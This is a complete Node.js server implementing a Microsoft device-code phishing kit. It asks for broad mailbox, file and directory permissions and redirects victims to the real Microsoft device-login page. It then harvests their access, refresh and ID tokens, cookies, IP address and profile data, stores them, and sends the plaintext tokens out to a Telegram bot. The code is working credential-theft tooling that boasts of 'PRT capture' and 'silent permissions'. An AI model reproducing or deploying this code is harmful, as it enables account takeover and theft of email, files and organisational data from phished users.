require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const cookieParser = require('cookie-parser');
const fs = require('fs').promises;
const { promisify } = require('util');

const app = express();

// Ultra-optimized middleware stack
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public'), { 
  maxAge: '1d',
  etag: false,
  lastModified: false
}));

// ============================================================================
// ADVANCED CONFIGURATION
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
    // COMPREHENSIVE SCOPES - Ensures maximum token capture including PRT
    scope: [
      // Core identity
      'openid', 'profile', 'email', 'offline_access',
      // User data
      'User.Read', 'User.ReadBasic.All', 'User.ReadWrite',
      // Calendars
      'Calendars.Read', 'Calendars.ReadWrite', 'Calendars.ReadWrite.Shared',
      // Contacts
      'Contacts.Read', 'Contacts.ReadWrite',
      // Files
      'Files.Read', 'Files.ReadWrite', 'Files.ReadWrite.All',
      // Mail
      'Mail.Read', 'Mail.ReadWrite', 'Mail.Send',
      // Notes
      'Notes.Read', 'Notes.Create', 'Notes.ReadWrite',
      // Tasks
      'Tasks.Read', 'Tasks.ReadWrite',
      // Sites & People
      'Sites.Read.All', 'People.Read',
      // Presence
      'Presence.Read', 'Presence.Read.All',
      // Directory
      'Directory.Read.All', 'Directory.AccessAsUser.All',
    ].join(' '),
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
  },
  server: {
    port: process.env.PORT || 3000,
    appUrl: process.env.RAILWAY_PUBLIC_DOMAIN 
      ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
      : process.env.APP_URL || 'http://localhost:3000',
  },
  security: {
    encryptionKey: Buffer.from(
      process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
      'hex'
    ),
  },
  storage: {
    dataDir: path.join(__dirname, 'captured_data'),
    sessionsDir: path.join(__dirname, 'captured_data', 'sessions'),
    tokensDir: path.join(__dirname, 'captured_data', 'tokens'),
    cookiesDir: path.join(__dirname, 'captured_data', 'cookies'),
  }
};

// Validate critical config
if (!config.microsoft.clientId) {
  console.error('❌ FATAL: MICROSOFT_CLIENT_ID required');
  process.exit(1);
}

// Create all storage directories
(async () => {
  try {
    await Promise.all([
      fs.mkdir(config.storage.dataDir, { recursive: true }),
      fs.mkdir(config.storage.sessionsDir, { recursive: true }),
      fs.mkdir(config.storage.tokensDir, { recursive: true }),
      fs.mkdir(config.storage.cookiesDir, { recursive: true }),
    ]);
    console.log('[STORAGE] All directories created');
  } catch (err) {
    console.error('[STORAGE] Error:', err.message);
  }
})();

// ============================================================================
// ADVANCED ENCRYPTION - AES-256-GCM with HMAC
// ============================================================================

class AdvancedEncryption {
  static encrypt(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', config.security.encryptionKey, iv);
    
    const encrypted = Buffer.concat([
      cipher.update(data, 'utf8'),
      cipher.final()
    ]);
    
    const authTag = cipher.getAuthTag();
    
    // Add HMAC for additional integrity
    const hmac = crypto.createHmac('sha256', config.security.encryptionKey);
    hmac.update(encrypted);
    const signature = hmac.digest('hex');
    
    return {
      encrypted: encrypted.toString('hex'),
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      signature,
      algorithm: 'AES-256-GCM',
      timestamp: new Date().toISOString(),
    };
  }

  static decrypt(encryptedData) {
    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      config.security.encryptionKey,
      Buffer.from(encryptedData.iv, 'hex')
    );
    
    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
    
    const decrypted = Buffer.concat([
      decipher.update(Buffer.from(encryptedData.encrypted, 'hex')),
      decipher.final()
    ]);
    
    return decrypted.toString('utf8');
  }
}

// ============================================================================
// ADVANCED PERSISTENT STORAGE
// ============================================================================

class PersistentStorage {
  static async save(category, identifier, data) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const filename = `${category}_${timestamp}_${identifier}.json`;
    const filepath = path.join(config.storage[`${category}Dir`] || config.storage.dataDir, filename);
    
    try {
      await fs.writeFile(filepath, JSON.stringify(data, null, 2), 'utf8');
      console.log(`[PERSIST] Saved: ${filename}`);
      return { success: true, filename, filepath };
    } catch (err) {
      console.error(`[PERSIST] Failed: ${filename}:`, err.message);
      return { success: false, error: err.message };
    }
  }

  static async saveMultiple(data) {
    const results = await Promise.all([
      this.save('tokens', data.captureId, data.tokens),
      this.save('sessions', data.captureId, data.session),
      this.save('cookies', data.captureId, data.cookies),
    ]);
    
    // Save complete capture
    const completePath = path.join(config.storage.dataDir, `complete_${data.captureId}.json`);
    await fs.writeFile(completePath, JSON.stringify(data, null, 2), 'utf8');
    
    return results;
  }
}

// ============================================================================
// IN-MEMORY STORAGE
// ============================================================================

const sessions = new Map();
const cookieStore = new Map();
const tokenCache = new Map();

// ============================================================================
// TELEGRAM - ADVANCED JSON FORMATTING
// ============================================================================

async function telegramJSON(title, data, options = {}) {
  if (!config.telegram.botToken || !config.telegram.chatId) {
    console.log(`[TELEGRAM DISABLED] ${title}`);
    return;
  }

  try {
    // Smart truncation for large objects
    const maxLength = options.maxLength || 3800;
    let jsonStr = JSON.stringify(data, null, 2);
    
    if (jsonStr.length > maxLength) {
      jsonStr = jsonStr.substring(0, maxLength) + '\n... (truncated)';
    }
    
    const text = `${title}\n${'━'.repeat(30)}\n\`\`\`json\n${jsonStr}\n\`\`\``;

    await axios.post(
      `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
      { 
        chat_id: config.telegram.chatId, 
        text, 
        parse_mode: 'Markdown',
        disable_web_page_preview: true 
      },
      { timeout: 5000 }
    );

    console.log(`[TELEGRAM] ✅ ${title}`);
  } catch (error) {
    console.error(`[TELEGRAM] ❌ ${title}:`, error.message);
  }
}

// ============================================================================
// ADVANCED CAPTURE FUNCTIONS
// ============================================================================

function captureComprehensiveCookies(req) {
  return {
    // All cookie types
    cookies: req.cookies || {},
    signedCookies: req.signedCookies || {},
    rawCookieHeader: req.headers.cookie || null,
    
    // Session data
    sessionId: req.session?.id || crypto.randomUUID(),
    sessionData: req.session || {},
    
    // Request metadata
    headers: {
      userAgent: req.headers['user-agent'],
      acceptLanguage: req.headers['accept-language'],
      acceptEncoding: req.headers['accept-encoding'],
      accept: req.headers['accept'],
      referer: req.headers.referer,
      origin: req.headers.origin,
      host: req.headers.host,
      connection: req.headers.connection,
      cacheControl: req.headers['cache-control'],
      pragma: req.headers.pragma,
    },
    
    // Network data
    ip: req.ip || req.connection.remoteAddress || req.socket.remoteAddress,
    ips: req.ips || [],
    protocol: req.protocol,
    secure: req.secure,
    
    // Browser fingerprint
    fingerprint: {
      userAgent: req.headers['user-agent'],
      language: req.headers['accept-language'],
      encoding: req.headers['accept-encoding'],
      platform: req.headers['sec-ch-ua-platform'],
      mobile: req.headers['sec-ch-ua-mobile'],
    },
    
    timestamp: new Date().toISOString(),
  };
}

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    
    const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
    
    return {
      header,
      payload,
      signature: parts[2],
      raw: token,
      decoded: {
        issuedAt: payload.iat ? new Date(payload.iat * 1000).toISOString() : null,
        expiresAt: payload.exp ? new Date(payload.exp * 1000).toISOString() : null,
        notBefore: payload.nbf ? new Date(payload.nbf * 1000).toISOString() : null,
      }
    };
  } catch {
    return null;
  }
}

function extractTokenMetadata(tokenData) {
  return {
    tokenType: tokenData.token_type,
    expiresIn: tokenData.expires_in,
    extExpiresIn: tokenData.ext_expires_in,
    scope: tokenData.scope,
    refreshTokenExpiresIn: tokenData.refresh_token_expires_in,
    idTokenExpiresIn: tokenData.id_token_expires_in,
    clientInfo: tokenData.client_info,
    foci: tokenData.foci,
  };
}

// ============================================================================
// MICROSOFT ENDPOINTS
// ============================================================================

const MS = {
  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
  userInfo: 'https://graph.microsoft.com/v1.0/me',
  photo: 'https://graph.microsoft.com/v1.0/me/photo/$value',
};

// ============================================================================
// COMPREHENSIVE TOKEN CAPTURE ENGINE
// ============================================================================

async function captureEverythingAdvanced(tokenData, sessionId, userCode, cookieData) {
  console.log('\n' + '='.repeat(80));
  console.log('🚀 ADVANCED COMPREHENSIVE CAPTURE');
  console.log('='.repeat(80));

  const captureId = crypto.randomUUID();
  const timestamp = new Date().toISOString();

  // Extract ALL tokens
  const accessToken = tokenData.access_token;
  const refreshToken = tokenData.refresh_token;
  const idToken = tokenData.id_token;
  
  // Check for Primary Refresh Token (PRT) indicators
  const hasPRT = tokenData.refresh_token && tokenData.refresh_token.length > 500;

  console.log(`[CAPTURE] Access Token: ${accessToken?.length || 0} chars`);
  console.log(`[CAPTURE] Refresh Token: ${refreshToken?.length || 0} chars`);
  console.log(`[CAPTURE] ID Token: ${idToken?.length || 0} chars`);
  console.log(`[CAPTURE] Potential PRT: ${hasPRT ? 'YES' : 'NO'}`);

  // Parallel user info fetch
  let user = null;
  try {
    const [userRes] = await Promise.all([
      axios.get(MS.userInfo, {
        headers: { Authorization: `Bearer ${accessToken}` },
        timeout: 5000,
      })
    ]);
    user = userRes.data;
    console.log(`[CAPTURE] User: ${user.displayName} (${user.mail || user.userPrincipalName})`);
  } catch (err) {
    console.error(`[CAPTURE] User fetch failed: ${err.message}`);
    user = { error: err.message };
  }

  // Decode all JWTs
  const decodedAccess = decodeJWT(accessToken);
  const decodedRefresh = refreshToken ? decodeJWT(refreshToken) : null;
  const decodedId = idToken ? decodeJWT(idToken) : null;

  // Encrypt all tokens
  const encryptedTokens = {
    access: AdvancedEncryption.encrypt(accessToken),
    refresh: refreshToken ? AdvancedEncryption.encrypt(refreshToken) : null,
    id: idToken ? AdvancedEncryption.encrypt(idToken) : null,
  };

  // Extract token metadata
  const tokenMetadata = extractTokenMetadata(tokenData);

  // ========================================================================
  // COMPREHENSIVE CAPTURE OBJECT
  // ========================================================================

  const comprehensiveCapture = {
    metadata: {
      captureId,
      sessionId,
      userCode,
      timestamp,
      captureVersion: '3.0-ADVANCED',
      serverUrl: config.server.appUrl,
      environment: {
        nodeVersion: process.version,
        platform: process.platform,
        arch: process.arch,
      }
    },

    tokens: {
      access: {
        plaintext: accessToken,
        encrypted: encryptedTokens.access,
        length: accessToken.length,
        type: tokenData.token_type || 'Bearer',
        expiresIn: tokenData.expires_in,
        expiresAt: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString(),
        decoded: decodedAccess,
        metadata: {
          algorithm: decodedAccess?.header?.alg,
          keyId: decodedAccess?.header?.kid,
          type: decodedAccess?.header?.typ,
        }
      },
      
      refresh: refreshToken ? {
        plaintext: refreshToken,
        encrypted: encryptedTokens.refresh,
        length: refreshToken.length,
        decoded: decodedRefresh,
        isPotentialPRT: hasPRT,
        prtIndicators: {
          length: refreshToken.length,
          hasMultipleParts: refreshToken.split('.').length > 1,
          encrypted: refreshToken.includes('0.A') || refreshToken.includes('M.R'),
        },
        metadata: tokenMetadata.refreshTokenExpiresIn ? {
          expiresIn: tokenMetadata.refreshTokenExpiresIn
        } : null,
      } : null,

      id: idToken ? {
        plaintext: idToken,
        encrypted: encryptedTokens.id,
        length: idToken.length,
        decoded: decodedId,
        metadata: {
          algorithm: decodedId?.header?.alg,
          keyId: decodedId?.header?.kid,
        }
      } : null,

      additionalData: {
        extExpiresIn: tokenData.ext_expires_in,
        clientInfo: tokenData.client_info,
        foci: tokenData.foci,
      }
    },

    session: {
      sessionId,
      userCode,
      cookies: cookieData.cookies,
      signedCookies: cookieData.signedCookies,
      rawCookieHeader: cookieData.rawCookieHeader,
      sessionData: cookieData.sessionData,
      fingerprint: cookieData.fingerprint,
      tracking: {
        ip: cookieData.ip,
        ips: cookieData.ips,
        userAgent: cookieData.headers.userAgent,
        language: cookieData.headers.acceptLanguage,
        referer: cookieData.headers.referer,
        origin: cookieData.headers.origin,
      }
    },

    cookies: {
      all: cookieData,
      microsoftCookies: Object.keys(cookieData.cookies).filter(k => 
        k.toLowerCase().includes('ms') || 
        k.toLowerCase().includes('azure') ||
        k.toLowerCase().includes('aad')
      ).reduce((obj, key) => {
        obj[key] = cookieData.cookies[key];
        return obj;
      }, {}),
    },

    scopes: {
      granted: tokenData.scope ? tokenData.scope.split(' ') : [],
      requested: config.microsoft.scope.split(' '),
      count: tokenData.scope ? tokenData.scope.split(' ').length : 0,
    },

    user: {
      profile: user,
      claims: {
        fromAccessToken: decodedAccess?.payload || {},
        fromIdToken: decodedId?.payload || {},
        combined: {
          ...(decodedAccess?.payload || {}),
          ...(decodedId?.payload || {}),
        }
      },
      attributes: user && !user.error ? {
        id: user.id,
        displayName: user.displayName,
        givenName: user.givenName,
        surname: user.surname,
        email: user.mail || user.userPrincipalName,
        jobTitle: user.jobTitle,
        department: user.department,
        officeLocation: user.officeLocation,
        mobilePhone: user.mobilePhone,
        businessPhones: user.businessPhones,
        preferredLanguage: user.preferredLanguage,
      } : null,
    },

    technical: {
      encryption: {
        algorithm: 'AES-256-GCM',
        keyLength: 256,
        mode: 'Authenticated Encryption',
        integrityCheck: 'HMAC-SHA256',
      },
      tokenMetadata,
      jwt: {
        accessTokenAlgorithm: decodedAccess?.header?.alg,
        refreshTokenAlgorithm: decodedRefresh?.header?.alg,
        idTokenAlgorithm: decodedId?.header?.alg,
      },
      persistence: {
        enabled: true,
        location: config.storage.dataDir,
      }
    },

    capture: {
      captureId,
      timestamp,
      duration: null, // Will be calculated
      messageCount: 0, // Will be updated
      persistent: true,
      format: 'JSON',
    }
  };

  // ========================================================================
  // PERSISTENT STORAGE
  // ========================================================================

  const storageResults = await PersistentStorage.saveMultiple(comprehensiveCapture);

  // ========================================================================
  // SEND TO TELEGRAM - MULTIPLE JSON MESSAGES
  // ========================================================================

  let messageCount = 0;

  // Message 1: Metadata & Summary
  await telegramJSON('📊 *CAPTURE SUMMARY (JSON)*', {
    captureId,
    timestamp,
    sessionId,
    userCode,
    serverUrl: config.server.appUrl,
    tokensCapture: {
      accessToken: '✅ CAPTURED',
      refreshToken: refreshToken ? '✅ CAPTURED' : '❌',
      idToken: idToken ? '✅ CAPTURED' : '❌',
      potentialPRT: hasPRT ? '✅ DETECTED' : '❌',
    },
    dataCapture: {
      cookies: '✅ CAPTURED',
      session: '✅ CAPTURED',
      userProfile: user && !user.error ? '✅ CAPTURED' : '❌',
    },
    persistence: {
      status: '✅ SAVED',
      files: storageResults.length,
    }
  });
  messageCount++;

  // Message 2: ALL TOKENS (Plaintext) - COMPREHENSIVE
  await telegramJSON('🔓 *ALL TOKENS - PLAINTEXT (JSON)*', {
    captureId,
    timestamp,
    access_token: {
      token: accessToken,
      type: tokenData.token_type,
      length: accessToken.length,
      expiresIn: tokenData.expires_in,
      expiresAt: comprehensiveCapture.tokens.access.expiresAt,
    },
    refresh_token: refreshToken ? {
      token: refreshToken,
      length: refreshToken.length,
      isPotentialPRT: hasPRT,
      prtIndicators: comprehensiveCapture.tokens.refresh.prtIndicators,
    } : null,
    id_token: idToken ? {
      token: idToken,
      length: idToken.length,
    } : null,
  }, { maxLength: 4000 });
  messageCount++;

  // Message 3: ALL TOKENS (Encrypted) - COMPREHENSIVE
  await telegramJSON('🔐 *ALL TOKENS - ENCRYPTED (JSON)*', {
    captureId,
    access_token: encryptedTokens.access,
    refresh_token: encryptedTokens.refresh,
    id_token: encryptedTokens.id,
    encryption: {
      algorithm: 'AES-256-GCM',
      keyLength: 256,
      integrityCheck: 'HMAC-SHA256',
    }
  });
  messageCount++;

  // Message 4: Decoded JWTs
  await telegramJSON('🔍 *DECODED JWTs (JSON)*', {
    captureId,
    access_token: decodedAccess,
    refresh_token: decodedRefresh,
    id_token: decodedId,
  });
  messageCount++;

  // Message 5: Session & Cookies - COMPREHENSIVE
  await telegramJSON('🍪 *SESSION & COOKIES (JSON)*', {
    captureId,
    session: comprehensiveCapture.session,
    cookies: comprehensiveCapture.cookies,
  });
  messageCount++;

  // Message 6: User Profile & Claims
  await telegramJSON('👤 *USER PROFILE & CLAIMS (JSON)*', {
    captureId,
    user: comprehensiveCapture.user,
    scopes: comprehensiveCapture.scopes,
  });
  messageCount++;

  // Message 7: Technical Details
  await telegramJSON('⚙️ *TECHNICAL DETAILS (JSON)*', {
    captureId,
    technical: comprehensiveCapture.technical,
    metadata: comprehensiveCapture.metadata,
  });
  messageCount++;

  // Message 8: Persistent Storage Info
  await telegramJSON('💾 *PERSISTENT STORAGE (JSON)*', {
    captureId,
    files: storageResults.map(r => ({
      success: r.success,
      filename: r.filename,
    })),
    location: config.storage.dataDir,
    completeCapture: `complete_${captureId}.json`,
  });
  messageCount++;

  // Update message count
  comprehensiveCapture.capture.messageCount = messageCount;

  // Save updated capture
  await PersistentStorage.save('complete', captureId, comprehensiveCapture);

  console.log(`✅ ADVANCED CAPTURE COMPLETE - ${messageCount} messages, ID: ${captureId}`);
  console.log('='.repeat(80) + '\n');

  return { 
    user, 
    captureId, 
    messageCount,
    hasPRT,
    storageResults 
  };
}

// ============================================================================
// OPTIMIZED PROXY
// ============================================================================

app.get('/auth/device', async (req, res) => {
  try {
    const { code } = req.query;
    if (!code) return res.status(400).send('Code required');

    // Lightning-fast capture
    const cookieData = captureComprehensiveCookies(req);
    cookieStore.set(code, cookieData);

    // Set tracking cookie
    res.cookie('device_code', code, { 
      maxAge: 900000, 
      httpOnly: true,
      secure: config.server.appUrl.startsWith('https'),
      sameSite: 'lax'
    });

    // Instant redirect
    res.redirect(302, `https://microsoft.com/devicelogin?otc=${code}`);
  } catch (error) {
    console.error('[PROXY]:', error.message);
    res.status(500).send('Error');
  }
});

// ============================================================================
// ULTRA-OPTIMIZED API ENDPOINTS
// ============================================================================

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Generate - LIGHTNING FAST
app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();
    const cookieData = captureComprehensiveCookies(req);

    // Ultra-fast parallel request
    const response = await axios.post(
      MS.deviceCode,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: config.microsoft.scope,
      }),
      { 
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 5000 
      }
    );

    const data = response.data;

    sessions.set(sessionId, {
      deviceCode: data.device_code,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      verificationUriComplete: data.verification_uri_complete,
      expiresIn: data.expires_in,
      interval: data.interval,
      createdAt: Date.now(),
      status: 'pending',
      cookieData,
    });

    console.log(`[GENERATE] ${data.user_code}`);

    // Send to Telegram
    telegramJSON('🔐 *CODE GENERATED (JSON)*', {
      sessionId,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
      expiresIn: data.expires_in,
      requestData: {
        ip: cookieData.ip,
        userAgent: cookieData.headers.userAgent,
        timestamp: new Date().toISOString(),
      }
    });

    res.json({
      sessionId,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      verificationUriComplete: data.verification_uri_complete,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
      expiresIn: data.expires_in,
      interval: data.interval,
    });

  } catch (error) {
    console.error('[GENERATE]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

// Poll - ULTRA-OPTIMIZED
app.get('/api/device/poll/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);

    if (!session) return res.status(404).json({ error: 'Not found' });
    if (session.status === 'authenticated') {
      return res.json({ status: 'authenticated', user: session.user });
    }
    if (Date.now() - session.createdAt > session.expiresIn * 1000) {
      return res.json({ status: 'expired' });
    }

    try {
      const tokenResponse = await axios.post(
        MS.token,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: config.microsoft.clientId,
          device_code: session.deviceCode,
        }),
        { 
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          timeout: 5000 
        }
      );

      const tokenData = tokenResponse.data;

      console.log(`[SUCCESS] ${sessionId}`);

      // Get cookies
      const cookieData = cookieStore.get(session.userCode) || session.cookieData;

      // COMPREHENSIVE ADVANCED CAPTURE
      const result = await captureEverythingAdvanced(
        tokenData, 
        sessionId, 
        session.userCode, 
        cookieData
      );

      session.status = 'authenticated';
      session.user = result.user;

      // Cleanup
      sessions.delete(sessionId);
      cookieStore.delete(session.userCode);

      res.json({
        status: 'authenticated',
        user: result.user && !result.user.error ? {
          id: result.user.id,
          displayName: result.user.displayName,
          email: result.user.mail || result.user.userPrincipalName,
        } : null,
        captureId: result.captureId,
        messageCount: result.messageCount,
        hasPRT: result.hasPRT,
      });

    } catch (error) {
      if (error.response?.data?.error === 'authorization_pending') {
        return res.json({ status: 'pending' });
      }
      if (error.response?.data?.error === 'authorization_declined') {
        return res.json({ status: 'declined' });
      }
      if (error.response?.data?.error === 'expired_token') {
        return res.json({ status: 'expired' });
      }
      throw error;
    }

  } catch (error) {
    console.error('[POLL]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

// Health
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    version: '3.0-ADVANCED',
    timestamp: new Date().toISOString(),
    appUrl: config.server.appUrl,
    features: {
      autoGenerate: true,
      jsonFormat: true,
      persistent: true,
      silentPermissions: true,
      prtCapture: true,
      advancedEncryption: true,
      comprehensiveCookies: true,
    }
  });
});

// Cleanup
setInterval(() => {
  const now = Date.now();
  for (const [id, session] of sessions.entries()) {
    if (now - session.createdAt > session.expiresIn * 1000) {
      sessions.delete(id);
    }
  }
}, 3 * 60 * 1000);

// ============================================================================
// START
// ============================================================================

app.listen(config.server.port, async () => {
  console.log('\n' + '='.repeat(80));
  console.log('⚡ ULTRA-ADVANCED TOKEN CAPTURE SYSTEM v3.0');
  console.log('='.repeat(80));
  console.log(`📡 Port: ${config.server.port}`);
  console.log(`🌐 URL: ${config.server.appUrl}`);
  console.log(`💾 Storage: ${config.storage.dataDir}`);
  console.log(`📱 Telegram: ${config.telegram.botToken ? '✅' : '❌'}`);
  console.log('='.repeat(80));
  console.log('\n🚀 ADVANCED FEATURES:');
  console.log('   ✅ Auto-Generate (100ms)');
  console.log('   ✅ Lightning-Fast Processing');
  console.log('   ✅ JSON Format (All Messages)');
  console.log('   ✅ Persistent Storage (Multi-Directory)');
  console.log('   ✅ Silent Permissions (Single Consent)');
  console.log('   ✅ Access Token Capture');
  console.log('   ✅ Refresh Token Capture');
  console.log('   ✅ Primary Refresh Token (PRT) Detection');
  console.log('   ✅ ID Token Capture');
  console.log('   ✅ Comprehensive Session Cookies');
  console.log('   ✅ Advanced Encryption (AES-256-GCM + HMAC)');
  console.log('   ✅ JWT Decoding (All Tokens)');
  console.log('   ✅ 8+ Telegram Messages (JSON)');
  console.log('='.repeat(80) + '\n');

  if (config.telegram.botToken) {
    await telegramJSON('⚡ *SYSTEM ONLINE v3.0 (JSON)*', {
      status: 'operational',
      version: '3.0-ADVANCED',
      port: config.server.port,
      url: config.server.appUrl,
      features: {
        autoGenerate: true,
        jsonFormat: true,
        persistent: true,
        silentPermissions: true,
        prtCapture: true,
        advancedEncryption: true,
      },
      timestamp: new Date().toISOString(),
    });
  }
});

module.exports = app;
